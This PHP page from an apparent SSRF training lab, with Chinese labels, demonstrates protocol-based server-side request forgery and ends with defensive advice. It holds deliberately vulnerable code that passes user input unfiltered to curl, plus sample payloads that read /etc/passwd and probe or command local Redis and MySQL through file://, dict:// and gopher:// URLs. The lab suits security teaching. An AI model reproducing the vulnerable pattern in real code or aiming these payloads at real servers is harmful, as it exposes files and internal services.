<?php
// 协议利用SSRF漏洞
$module_name = '协议利用';
$module_icon = '🔗';
$module_desc = '利用各种协议进行SSRF攻击，如file://、gopher://、dict://等。';

// 漏洞代码
$result = '';
$error = '';

if (isset($_GET['protocol'])) {
    $protocol = $_GET['protocol'];
    
    // 漏洞：直接使用用户输入的协议URL，没有过滤
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $protocol);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // 跟随重定向
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 禁用SSL证书验证
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // 禁用SSL主机验证
        
        $response = curl_exec($ch);
        
        if (curl_errno($ch)) {
            $error = '请求失败：' . curl_error($ch);
        } else {
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if (strlen($response) > 1000) {
                $response = substr($response, 0, 1000) . '...（截断）';
            }
            $result = '协议请求成功，HTTP状态码：' . $http_code . '\n\n响应内容：\n' . htmlspecialchars($response);
        }
        
        curl_close($ch);
    } catch (Exception $e) {
        $error = '请求异常：' . $e->getMessage();
    }
}

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">🔗 协议利用</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示协议利用SSRF漏洞。<br>
                攻击者可以利用各种协议进行SSRF攻击，如file://读取本地文件、gopher://发送TCP数据、dict://获取信息等。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_GET["protocol"])) {
    $protocol = $_GET["protocol"];
    
    // 漏洞：直接使用用户输入的协议URL，没有过滤
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $protocol);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    
    curl_close($ch);
}
</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示协议利用SSRF漏洞，尝试以下攻击：</p>

                    <ol>
                        <li>file:// 协议：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=file:///etc/passwd</code> - 读取系统文件（Linux）</li>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=file:///windows/win.ini</code> - 读取系统文件（Windows）</li>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=file:///d:/phpstudy_pro/WWW/zhaosec/ssrf/index.php</code> - 读取本地文件</li>
                        </ul>
                        <li>dict:// 协议：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=dict://127.0.0.1:6379/info</code> - 获取Redis信息</li>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=dict://127.0.0.1:3306/version</code> - 获取MySQL版本</li>
                        </ul>
                        <li>gopher:// 协议：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=gopher://127.0.0.1:6379/_info</code> - 向Redis发送命令</li>
                        </ul>
                        <li>其他协议：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=ftp://ftp.gnu.org/gnu/bash/bash-5.0.tar.gz</code> - FTP协议</li>
                            <li><code>http://localhost/zhaosec/ssrf/protocol_ssrf.php?protocol=ldap://127.0.0.1:389</code> - LDAP协议</li>
                        </ul>
                    </ol>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <form method="GET" class="mb-3">
                        <div class="input-group">
                            <span class="input-group-text">协议URL</span>
                            <input type="text" name="protocol" class="form-control" placeholder="例如：file:///etc/passwd">
                            <button type="submit" class="btn btn-danger">测试</button>
                        </div>
                    </form>

                    ';

if ($error) {
    $content .= '<div class="alert alert-danger">
                        <strong>错误：</strong>
                        <p>' . htmlspecialchars($error) . '</p>
                    </div>';
}

if ($result) {
    $content .= '<div class="alert alert-secondary">
                        <strong>协议测试结果：</strong>
                        <pre class="mb-0 mt-2"><code>' . htmlspecialchars($result) . '</code></pre>
                    </div>';
}

$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>协议限制：</strong>只允许http、https协议，禁止file://、gopher://、dict://等危险协议</li>
                        <li><strong>URL白名单：</strong>只允许访问特定的域名或IP</li>
                        <li><strong>输入验证：</strong>对用户输入的URL进行严格验证</li>
                        <li><strong>使用安全库：</strong>使用安全的HTTP客户端库，限制协议支持</li>
                        <li><strong>网络隔离：</strong>实施网络分段，限制服务器的网络访问范围</li>
                        <li><strong>监控异常访问：</strong>监控对危险协议的访问尝试</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>